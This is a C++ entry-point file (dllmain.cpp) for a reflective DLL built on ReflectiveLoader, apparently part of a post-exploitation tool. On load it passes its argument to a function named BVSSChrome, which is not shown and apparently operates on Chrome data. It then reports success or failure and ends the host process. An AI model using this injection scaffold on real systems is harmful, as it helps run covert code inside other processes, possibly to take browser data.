// dllmain.cpp : Defines the entry point for the DLL application.
#include "ReflectiveLoader.h"
#include "Header.h"


extern "C" HINSTANCE hAppInstance;
BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
    switch (ul_reason_for_call)
    {
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
		{
			*(HMODULE *)lpReserved = hAppInstance;
		}
		break;
    case DLL_PROCESS_ATTACH:
		hAppInstance = hModule;
		if (lpReserved != NULL)
		{
			//Sorry :S
			int iChars = MultiByteToWideChar(CP_ACP, 0, (char *)lpReserved, -1, NULL, 0);			
			wchar_t *wArgs = (wchar_t*)calloc(iChars, sizeof(wchar_t));
			MultiByteToWideChar(CP_ACP, 0, (char*)lpReserved, -1, wArgs, iChars);

			if (BVSSChrome(wArgs))
				printf("\r\nRun Status: SUCCESS");
			else
				printf("r\nRun Status: FAILED");
			free(wArgs);
		}
		else
		{
			printf("No parameter passed to Reflective DLL");
		}		
		fflush(stdout);
		ExitProcess(0);
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

